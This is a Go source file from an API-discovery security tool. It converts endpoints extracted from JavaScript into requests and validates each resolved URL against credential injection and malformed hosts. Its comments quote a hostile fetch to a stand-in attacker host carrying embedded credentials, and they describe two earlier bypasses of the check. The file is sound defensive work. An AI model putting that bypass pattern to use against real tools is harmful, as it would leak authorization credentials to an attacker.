// Copyright 2026 Praetorian Security, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package jsstatic

import (
	"encoding/json"
	"net/url"

	"github.com/praetorian-inc/vespasian/pkg/crawl"
)

// toRequests converts endpoints to requests, resolving relative URLs against
// captureURL. BodyFields become a synthetic {"field": null} body so
// rest.InferSchema produces a real object schema; no fields means a nil body.
func toRequests(endpoints []ExtractedEndpoint, captureURL string) []crawl.ObservedRequest {
	if len(endpoints) == 0 {
		return nil
	}

	var bundleBase *url.URL
	if captureURL != "" {
		if parsed, err := url.Parse(captureURL); err == nil {
			bundleBase = parsed
		}
	}

	reqs := make([]crawl.ObservedRequest, 0, len(endpoints))
	for _, ep := range endpoints {
		req := crawl.ObservedRequest{
			Method:  ep.Method,
			Source:  ep.SourceTag,
			PageURL: ep.PageURL,
		}

		// PageURL first for document-relative paths, then the bundle URL.
		base := bundleBase
		if ep.PageURL != "" {
			if pageBase, err := url.Parse(ep.PageURL); err == nil && pageBase.Host != "" {
				base = pageBase
			}
		}
		req.URL = resolveURL(ep.URL, base)

		// SEC-BE-001 / SEC-BE-002: validate the RESOLVED URL, not the literal, and here
		// rather than per-producer — this is the single point at which the final URL exists.
		// A prefix test on the literal misses `fetch("//u:p@attacker.example/api/collect")`,
		// which carries no scheme; base.ResolveReference then COPIES ref.User and inherits
		// the base scheme, reconstituting the same userinfo as an absolute URL. Nothing
		// downstream catches it: ssrf.ValidateURL inspects scheme and resolved IP but never
		// u.User, and with probe.Config.AuthHeaders unset by every non-test caller net/http
		// derives `Authorization: Basic <base64(userinfo)>` from req.URL.User on each probe.
		// The host also persists to capture.json and into the spec's servers list.
		//
		// Only credential/scheme/host validity and the byte policy are enforced here.
		// Same-origin stays a concat-only policy in extractConcatEndpoints — see the note
		// there for why AST literals must keep cross-origin recall.
		if !specSafeURL(req.URL) {
			continue
		}

		if len(ep.BodyFields) > 0 {
			req.Body = synthBody(ep.BodyFields)
		}

		if ep.ContentType != "" {
			req.Headers = map[string]string{"Content-Type": ep.ContentType}
		}

		reqs = append(reqs, req)
	}
	return reqs
}

// resolveURL returns rawURL unchanged when it is absolute or base is nil.
func resolveURL(rawURL string, base *url.URL) string {
	if base == nil {
		return rawURL
	}
	ref, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	if ref.IsAbs() {
		return rawURL
	}
	return base.ResolveReference(ref).String()
}

// synthBody marshals field->nil into a JSON object; nil when fields is empty.
//
// Deterministic whatever order fields arrives in: encoding/json sorts map keys
// ("The map keys are sorted and used as JSON object keys" —
// https://pkg.go.dev/encoding/json#Marshal), so callers need not pre-sort.
func synthBody(fields []string) []byte {
	if len(fields) == 0 {
		return nil
	}
	obj := make(map[string]interface{}, len(fields))
	for _, f := range fields {
		obj[f] = nil
	}
	b, err := json.Marshal(obj)
	if err != nil {
		return nil
	}
	return b
}

// specSafeURL reports whether a synthesized URL may be emitted. It is the single
// gate for every producer, applied in toRequests to the RESOLVED URL.
//
// Deliberately parse-based, with NO string-prefix test anywhere. That is the
// structural lesson from two successive bypasses of this gate: both were
// spellings that a `strings.HasPrefix(raw, "http://")`-style check classified as
// "not absolute" while url.Parse — and therefore every consumer downstream —
// disagreed.
//
//   - First bypass: the gate ran on the pre-resolution literal, so
//     `fetch("//u:p@attacker.example/api/collect")` skipped it and resolveURL's
//     base.ResolveReference then copied ref.User and inherited the base scheme.
//   - Second bypass: with the gate moved onto the resolved value, the same literal
//     still skipped it whenever the capture's own bundle URL was empty, because
//     resolveURL returns the literal UNCHANGED when base is nil — leaving it
//     scheme-relative, which the prefix test also does not match, even though
//     url.Parse reads Host="attacker.example" User=u:p from it.
//
// Asking url.Parse directly removes the whole class: whatever the spelling, if the
// parsed form carries userinfo it is rejected, and if it carries a host it must be
// http(s).
//
// Four rules:
//  1. Byte policy (crawl.IsPrintableASCIIURL) — no raw non-ASCII or control bytes
//     and no percent-escape decoding to them, so a hostile bundle cannot make a
//     spec path key or servers entry render differently from its bytes
//     (SEC-BE-002). Applied to all producers here; the concat producer's own
//     cleanConcatPath check is a stricter subset.
//  2. No userinfo, however spelled — this is the credential-injection sink:
//     ssrf.ValidateURL never inspects u.User and probe.Config.AuthHeaders is set
//     by no non-test caller, so net/http would derive `Authorization: Basic` from
//     req.URL.User on every probe (SEC-BE-001).
//  3. No opaque part (url.URL.Opaque != ""). An opaque URL ("scheme:opaque-data",
//     e.g. "mailto:x@y.com" or "https:api/x") carries neither a host nor a
//     resolvable path, so it can never be a real spec-safe endpoint.
//  4. A URL that carries a host must be http or https (catches the
//     scheme-relative form — host set, scheme empty — and any other scheme
//     reaching this point); AND an http(s)-scheme URL must carry a host (LAB-4992
//     review: "https:/api/x" parses to Scheme="https", Host="" — a single slash
//     after the scheme is not an authority marker — and the pre-fix rule below
//     only fired when Host != "", so this host-less "absolute" slipped through
//     and, once passed to extractServers, produced the degenerate "https://"
//     server entry that sorts before every real host and blanks info.title). A
//     purely relative path (no host, no scheme) is fine and is the common case.
func specSafeURL(raw string) bool {
	if !crawl.IsPrintableASCIIURL(raw) {
		return false
	}
	u, err := url.Parse(raw)
	if err != nil {
		return false
	}
	if u.User != nil {
		return false
	}
	if u.Opaque != "" {
		return false
	}
	isHTTPScheme := u.Scheme == "http" || u.Scheme == "https"
	if u.Host != "" && !isHTTPScheme {
		return false
	}
	if isHTTPScheme && u.Host == "" {
		return false
	}
	return true
}
